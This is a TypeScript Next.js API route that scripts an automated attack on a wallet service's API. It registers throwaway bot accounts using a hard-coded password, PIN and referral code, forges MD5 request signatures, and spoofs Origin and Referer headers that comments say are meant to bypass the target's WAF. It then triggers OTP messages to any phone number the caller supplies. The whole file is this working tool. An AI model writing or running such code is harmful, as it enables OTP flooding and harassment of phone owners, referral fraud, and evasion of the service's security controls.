import crypto from 'crypto';
import { NextResponse } from 'next/server';

/**
 * Standardized CORS Headers for Cross-Origin compatibility.
 * Prevents environment-level blockades and plain-text origin errors.
 */
const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, DELETE, PUT',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, Accept, X-Requested-With, token, Signature, Origin, Referer',
  'Access-Control-Max-Age': '86400',
};

/**
 * Senior Cryptographic Signature Engine.
 * Sorts keys alphabetically and appends session salt for MD5 verification.
 */
function generateSignature(dataDict: Record<string, any>, sessionKey: string = "") {
  const sortedKeys = Object.keys(dataDict).sort();
  let rawStr = "";
  for (const key of sortedKeys) {
    rawStr += `${key}${dataDict[key]}`;
  }
  rawStr += sessionKey;
  return crypto.createHash('md5').update(rawStr).digest('hex');
}

/**
 * Asynchronous Throttling Helper.
 */
const sleep = (ms: number) => new Promise(res => setTimeout(res, ms));

const TARGET_BASE_URL = "https://api.rswallet-api.com";

/**
 * STEALTH HEADERS: Manually injecting Origin and Referer to bypass Target Server WAF.
 */
const STEALTH_HEADERS = {
  "Accept": "application/json, text/plain, */*",
  "Content-Type": "application/json;charset=UTF-8",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Origin": "https://api.rswallet-api.com",
  "Referer": "https://api.rswallet-api.com/"
};

/**
 * Handles CORS Preflight requests to satisfy Next.js origin security.
 */
export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: CORS_HEADERS,
  });
}

/**
 * Safe Fetch Helper to prevent "Unexpected token" crashes.
 * Reads text first, checks for CORS/WAF block messages, then parses.
 */
async function safeFetch(url: string, options: any) {
  try {
    const res = await fetch(url, options);
    const rawText = await res.text();
    
    // Log upstream activity for debugging
    console.log(`[UPSTREAM] URL: ${url} | STATUS: ${res.status}`);

    if (!rawText) {
      return { code: res.status, message: "Empty upstream response" };
    }

    // Check if the body contains a plain text CORS error instead of JSON
    if (rawText.includes("Invalid CORS request") || rawText.includes("Forbidden")) {
      return { code: res.status, message: "Target Server CORS Block detected", raw: rawText.substring(0, 100) };
    }

    try {
      return JSON.parse(rawText);
    } catch (e) {
      return { code: res.status, message: "Invalid JSON from upstream", raw: rawText.substring(0, 200) };
    }
  } catch (err: any) {
    return { code: 500, message: "Connection Failure", error: err.message };
  }
}

/**
 * Robust Backend Orchestrator for Multi-Step Sequential Workflow.
 */
export async function POST(request: Request) {
  const logs: any[] = [];
  
  try {
    // Universal JSON Boundary: Always catch errors to prevent plain-text leak
    const body = await request.json().catch(() => ({}));
    const targetPhone = body.phone;
    const accountType = body.accountType || "1";

    if (!targetPhone) {
      return NextResponse.json({ 
        code: 400, 
        message: "Identification Required: Phone number missing.", 
        logs: [] 
      }, { status: 200, headers: CORS_HEADERS });
    }

    // Step 0: Bot Profile Generation
    const botPhone = ["6", "7", "8", "9"][Math.floor(Math.random() * 4)] + 
                     Array.from({ length: 9 }, () => Math.floor(Math.random() * 10)).join('');
    
    const password = "Ritik@123";
    const pinCode = "954073";
    const referralCode = "0ealuckpayvp";

    // 1. Bot Registration
    await sleep(2000);
    const regJson = await safeFetch(`${TARGET_BASE_URL}/app/auth/register`, {
      method: 'POST',
      headers: STEALTH_HEADERS,
      body: JSON.stringify({ phone: botPhone, password, referralCode })
    });
    logs.push({ "Step 1: Bot Registration": regJson });

    if (regJson.code !== 200) {
      return NextResponse.json({ 
        code: 429, 
        message: regJson.message || "Gateway rejection", 
        logs 
      }, { status: 200, headers: CORS_HEADERS });
    }

    // 2. Bot Login
    await sleep(2000);
    const loginJson = await safeFetch(`${TARGET_BASE_URL}/app/auth/login`, {
      method: 'POST',
      headers: STEALTH_HEADERS,
      body: JSON.stringify({ phone: botPhone, password })
    });
    logs.push({ "Step 2: Bot Login": loginJson });

    if (loginJson.code !== 200) {
      return NextResponse.json({ code: 401, message: "Auth Sequence Failed", logs }, { status: 200, headers: CORS_HEADERS });
    }

    const { userId, loginToken: token, sessionKey } = loginJson.data;
    const authHeaders: Record<string, string> = {
      ...STEALTH_HEADERS,
      "Authorization": token,
      "token": token
    };

    // 3. Pin Bind
    await sleep(2000);
    let ts = Date.now();
    let pinPayload = { pinCode, ts, userId };
    authHeaders["Signature"] = generateSignature(pinPayload, sessionKey);
    const bindJson = await safeFetch(`${TARGET_BASE_URL}/app/secure/pin/bind`, {
      method: 'POST',
      headers: authHeaders,
      body: JSON.stringify(pinPayload)
    });
    logs.push({ "Step 3: Secure Pin Bind": bindJson });

    // 4. Pin Verify
    await sleep(2000);
    ts = Date.now();
    pinPayload = { pinCode, ts, userId };
    authHeaders["Signature"] = generateSignature(pinPayload, sessionKey);
    const verifyJson = await safeFetch(`${TARGET_BASE_URL}/app/secure/pin/verify`, {
      method: 'POST',
      headers: authHeaders,
      body: JSON.stringify(pinPayload)
    });
    logs.push({ "Step 4: PIN Verification": verifyJson });

    // 5. Pre Check Integrity
    await sleep(2000);
    ts = Date.now();
    const prePayload = { mobile: targetPhone, type: 13, appPinCode: pinCode, ts, userId };
    authHeaders["Signature"] = generateSignature(prePayload, sessionKey);
    const preJson = await safeFetch(`${TARGET_BASE_URL}/app/bind/pre/check`, {
      method: 'POST',
      headers: authHeaders,
      body: JSON.stringify(prePayload)
    });
    logs.push({ "Step 5: Pre-Dispatch Check": preJson });

    // 6. OTP Dispatch to Target
    await sleep(2000);
    ts = Date.now();
    const otpPayload = { mobile: targetPhone, type: 13, accountType: String(accountType), ts, userId };
    authHeaders["Signature"] = generateSignature(otpPayload, sessionKey);
    const otpJson = await safeFetch(`${TARGET_BASE_URL}/app/bind/send/otp`, {
      method: 'POST',
      headers: authHeaders,
      body: JSON.stringify(otpPayload)
    });
    logs.push({ "Step 6: OTP Action Trigger": otpJson });

    return NextResponse.json({ 
      code: 200, 
      message: "Orchestration successfully processed.", 
      logs 
    }, { status: 200, headers: CORS_HEADERS });

  } catch (err: any) {
    console.error('[CRITICAL FLOW ERROR]:', err);
    return NextResponse.json({ 
      code: 500, 
      message: `System Integrity Fault: ${err.message}`, 
      logs: logs 
    }, { status: 200, headers: CORS_HEADERS });
  }
}
